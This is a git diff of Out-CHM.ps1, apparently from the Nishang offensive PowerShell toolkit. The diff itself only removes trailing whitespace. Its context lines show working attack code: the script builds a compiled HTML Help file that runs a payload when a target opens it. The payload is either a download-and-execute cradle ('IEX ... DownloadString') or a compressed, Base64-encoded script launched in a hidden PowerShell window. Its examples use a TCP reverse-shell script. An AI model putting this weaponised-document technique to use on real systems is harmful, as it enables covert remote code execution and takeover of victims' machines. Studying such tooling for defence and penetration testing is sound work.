@@ -20,7 +20,7 @@ URL of the PowerShell script which would be executed on the target.
 
 .PARAMETER PayloadScript
 Path to a PowerShell script on local machine.
-Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself.  
+Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself.
 
 .PARAMETER Arguments
 Arguments to the PowerShell script to be executed on the target.
@@ -40,8 +40,8 @@ Above command would execute Get-Process on the target machine when the CHM file 
 .EXAMPLE
 PS > Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
 
-Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
-you must pass the parameters in the script itself. 
+Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,
+you must pass the parameters in the script itself.
 
 
 .EXAMPLE
@@ -63,7 +63,7 @@ Use above command to pass an argument to the PowerShell script/module.
 .EXAMPLE
 PS > Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
 
-Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
+Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,
 you must pass the parameters in the script itself.
 
 .LINK
@@ -78,11 +78,11 @@ https://twitter.com/ithurricanept/status/534993743196090368
 
 
     [CmdletBinding()] Param(
-        
+
         [Parameter(Position = 0, Mandatory = $False)]
         [String]
         $Payload,
-        
+
         [Parameter(Position = 1, Mandatory = $False)]
         [String]
         $PayloadURL,
@@ -108,13 +108,13 @@ https://twitter.com/ithurricanept/status/534993743196090368
     if(!$Payload)
     {
         $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
-    }    
+    }
 
     if($PayloadScript)
     {
         #Logic to read, compress and Base64 encode the payload script.
         $Enc = Get-Content $PayloadScript -Encoding Ascii
-    
+
         #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
         $ms = New-Object IO.MemoryStream
         $action = [IO.Compression.CompressionMode]::Compress
@@ -122,10 +122,10 @@ https://twitter.com/ithurricanept/status/534993743196090368
         $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
         $Enc | ForEach-Object {$sw.WriteLine($_)}
         $sw.Close()
-    
+
         # Base64 encode stream
         $Compressed = [Convert]::ToBase64String($ms.ToArray())
-    
+
         $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
 
         "`$(New-Object IO.Compression.DeflateStream (" +
@@ -148,7 +148,7 @@ https://twitter.com/ithurricanept/status/534993743196090368
         }
         else
         {
-            $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
+            $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"
         }
     }
 
@@ -310,7 +310,7 @@ Multiple logical IP networks are in use and this computer needs a different IP a
     Out-File -InputObject $CHMHTML1 -FilePath "$OutputPath\doc.htm" -Encoding default
     Out-File -InputObject $CHMHTML2 -FilePath "$OutputPath\doc1.htm" -Encoding default
     Out-File -InputObject $CHMProject -FilePath "$OutputPath\doc.hhp" -Encoding default
-    
+
     #Compile the CHM, only this needs to be sent to a target.
     $HHC = "$HHCPath" + "\hhc.exe"
     & "$HHC" "$OutputPath\doc.hhp"
@@ -320,7 +320,7 @@ Multiple logical IP networks are in use and this computer needs a different IP a
     Remove-Item "$OutputPath\doc.htm"
     Remove-Item "$OutputPath\doc1.htm"
     Remove-Item "$OutputPath\doc.hhp"
-    
+
 }
 
 
